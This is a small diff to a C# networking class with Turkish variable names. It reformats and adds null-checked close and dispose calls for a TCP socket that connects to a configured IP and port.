@@ -118,10 +118,12 @@ namespace Task2
                     ipadresi = Dns.GetHostAddresses(MainValues.IP)[0];
                     endpoint = new IPEndPoint(ipadresi, MainValues.port);
 
-                    if (Soketimiz != null) {
-                        try { Soketimiz.Close(); } catch (Exception) { } try { Soketimiz.Dispose(); } catch (Exception) { }                     
+                    if (Soketimiz != null)
+                    {
+                        try { Soketimiz.Close(); } catch (Exception) { }
+                        try { Soketimiz.Dispose(); } catch (Exception) { }
                     }
-                    
+
                     Soketimiz = new Socket(AddressFamily.InterNetwork, SocketType.Stream, System.Net.Sockets.ProtocolType.Tcp);
                     Soketimiz.ReceiveTimeout = -1; Soketimiz.SendTimeout = -1;
                     Soketimiz.ReceiveBufferSize = int.MaxValue; Soketimiz.SendBufferSize = int.MaxValue;
@@ -245,8 +247,12 @@ namespace Task2
                     {
                         memos.Flush(); memos.Close(); memos.Dispose();
                     }
-                    Dispose();
-                    
+                    if (Soketimiz != null)
+                    {
+                        try { Soketimiz.Close(); } catch (Exception) { }
+                        try { Soketimiz.Dispose(); } catch (Exception) { }
+                    }
+                    Dispose();                    
                     if (tmp_form.CLOSE_CONNECTION == false)
                     {
 
